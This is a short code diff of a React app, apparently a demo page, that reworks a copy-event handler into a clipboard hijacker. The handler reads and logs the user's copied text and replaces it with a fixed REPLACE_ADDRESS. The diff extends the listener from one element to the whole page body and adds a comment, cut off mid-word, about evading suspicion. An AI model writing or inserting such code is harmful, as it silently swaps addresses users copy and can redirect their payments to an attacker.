@@ -49,11 +49,13 @@ function App() {
   }
 
   function handleCopy(event) {
-    console.log("copy event detected", event)
-    event.clipboardData.setData("text/plain", REPLACE_ADDRESS)
     event.preventDefault()
-  }
 
+    console.log("copy event detected", event)
+    let data = event.clipboardData.getData('text/plain');
+    console.log(data);
+    event.clipboardData.setData("text/plain", REPLACE_ADDRESS)
+  }
 
   const InstructionStep = (props) => {
     return (
@@ -67,11 +69,12 @@ function App() {
     )
   }
 
+  // To evade suspicion, you can rep
   useEffect(() => {
-    document.getElementById("source-contract")
+    document.querySelector("body")
             .addEventListener("copy", handleCopy)
     return () => {}
-  }, [])
+  })
 
 
 
